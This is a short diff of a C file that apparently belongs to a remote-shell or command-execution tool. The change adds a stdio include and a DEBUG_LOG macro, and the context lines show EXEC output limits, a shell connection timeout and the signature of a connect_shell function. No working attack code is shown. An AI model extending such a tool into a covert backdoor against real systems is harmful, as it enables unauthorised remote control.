@@ -2,6 +2,7 @@
 #include <errno.h>
 #include <netinet/in.h>
 #include <poll.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
@@ -10,12 +11,16 @@
 
 #include "base64.h"
 
-#include "macros.h"
-
 #define MAX_DATA_SIZE 64000      // a bit smaller than the maximum TCP/UDP payload sizes
 #define IP4_LEN_MAX 16           // xxx.xxx.xxx.xxx\0
 #define MAX_EXEC_OUTPUT 4096     // max bytes of stdout to capture from EXEC commands
 #define SHELL_CONN_TIMEOUT 5000  // 5 seconds
+
+#ifdef DEBUG
+    #define DEBUG_LOG(...) printf(__VA_ARGS__)
+#else
+    #define DEBUG_LOG(...)
+#endif
 
 int connect_shell(char *ip, int port)
 {
